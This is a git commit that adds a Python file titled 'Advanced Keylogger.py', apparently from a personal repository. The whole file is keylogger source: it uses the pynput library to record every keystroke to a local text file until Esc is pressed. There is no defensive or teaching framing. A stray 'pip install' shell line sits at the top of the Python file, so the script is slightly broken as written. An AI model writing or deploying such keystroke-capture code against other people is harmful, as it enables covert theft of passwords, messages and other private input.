5e16b2db6969d894cd372e37ac50cc59f8d03b2c
Tejas Shivaprasad <123496858+xxTeJxx@users.noreply.github.com>
2024-10-17 20:26:29 +0530

    Create Advanced Keylogger.py

---
+++ Advanced Keylogger.py
@@ -0,0 +1,22 @@
+pip install pynput
+
+
+import pynput
+from pynput.keyboard import Key, Listener
+
+log_file = "key_log.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as log:
+            log.write(str(key.char)) 
+    except AttributeError:
+        with open(log_file, "a") as log:
+            log.write(f"[{key}]")
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()  
